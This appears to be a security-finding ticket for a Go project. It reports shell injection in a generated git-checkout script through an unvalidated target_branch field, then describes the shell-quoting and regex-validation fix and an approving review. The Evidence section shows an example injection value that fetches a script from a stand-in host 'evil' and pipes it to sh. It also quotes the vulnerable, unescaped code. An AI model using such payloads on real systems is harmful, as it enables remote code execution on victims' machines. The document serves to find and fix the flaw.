---
id: gate-security-finalize-script-shell-escape
kind: story
stage: done
tags: [security, portal, plugin]
parent: null
depends_on: []
release_binding: v0.1.0
gate_origin: security
created: 2026-05-18
updated: 2026-05-18
---

# Shell injection latent in `finalize` plan script via attacker-controlled `target_branch`

## Severity
Medium

## Domain
Input Validation & Injection

## Location
`internal/portal/finalize/script.go:160-167`,
`internal/portal/finalize/lock_patch.go:174`

## Evidence
```go
func writeCheckoutStep(b *strings.Builder, targetBranch, baseSHA string) {
    ...
    b.WriteString(fmt.Sprintf("echo \"==> Creating target branch %s at %s\"\n", targetBranch, short))
    b.WriteString(fmt.Sprintf("git checkout -b \"%s\" %s\n", targetBranch, baseSHA))
}
```

`target_branch` is taken straight from the lock-holder's
`PatchFinalizeLock` body with no shape validation and embedded inside a
bash double-quoted argument. A lock holder can set
``target_branch = `x";curl evil/i.sh|sh;#` `` and any session member who
later copy/pastes the rendered `plan.script` from a UI or terminal runs
arbitrary commands. The Go-side CLI plugin
(`cmd/jamsesh/finalizecmd/execute.go`) uses `exec.Command` and is safe,
but the script body shipped to clients is not.

## Remediation direction
Validate `target_branch` (and reject `base_sha` that isn't a hex SHA) at
`PatchFinalizeLock` time against `^[A-Za-z0-9._/-]+$` and ensure it
doesn't start with `-`. Also shell-escape both fields inside
`writeCheckoutStep` / `buildPreserveScript` / `buildSquashScript` via a
`shellquote` helper for defense-in-depth.

## Implementation notes

### New file: `internal/portal/finalize/escape.go`

Contains three exported symbols for use by the companion test story
(`gate-tests-finalize-shell-escape`):

- **`Shellquote(s string) string`** — wraps `s` in single quotes, escaping
  any internal single quotes via the `'\''` trick. Safe to splice into any
  position in a bash command. File-private alias `shellquote` is used
  throughout `script.go`.

- **`ValidateTargetBranch(branch string) bool`** — returns true when
  `branch` is non-empty, matches `^[A-Za-z0-9._/][A-Za-z0-9._/-]*$`, and
  does not start with `-`.

- **`ValidateBaseSHA(sha string) bool`** — returns true when `sha` matches
  `^[a-f0-9]{40}$` (full SHA-1).

### Changes to `internal/portal/finalize/script.go`

`writeCheckoutStep` now wraps both `targetBranch` and `baseSHA` with
`shellquote(...)`, switching from double-quoted to single-quoted bash
arguments. The "Done. Push when ready" echo at the end of both
`buildSquashScript` and `buildPreserveScript` also wraps the branch name
with `shellquote`. All six golden files in `testdata/` were updated to
reflect the new quoting.

### Changes to `internal/portal/finalize/lock_patch.go`

`PatchFinalizeLock` now validates both fields before writing to the store:
- Invalid `target_branch` → 400 `session.invalid_target_branch`
- Invalid `base_sha` (not a full 40-hex SHA-1) → 400 `session.invalid_base_sha`

### Test updates

Existing tests in `lock_patch_test.go` used stub values (`"base"`,
`"base123"`) that are not valid 40-hex SHAs. These were replaced with
`validBaseSHA = "deadbeefdeadbeefdeadbeefdeadbeefdeadbeef"` so they
continue exercising the happy path through the new validator.

## Review (2026-05-18)

**Verdict**: Approve

**Blockers**: none
**Important**: none
**Nits**: none

**Notes**: Shell-injection vector closed. New shellquote helper wraps target_branch and base_sha (single-quoted with internal-quote escape) in writeCheckoutStep / buildSquashScript / buildPreserveScript. PatchFinalizeLock validates target_branch (^[A-Za-z0-9._/][A-Za-z0-9._/-]*$, no leading dash) → 400 session.invalid_target_branch, and base_sha (40 hex) → 400 session.invalid_base_sha. Validators exported for the companion test story. Golden script outputs updated to reflect single-quoted form.
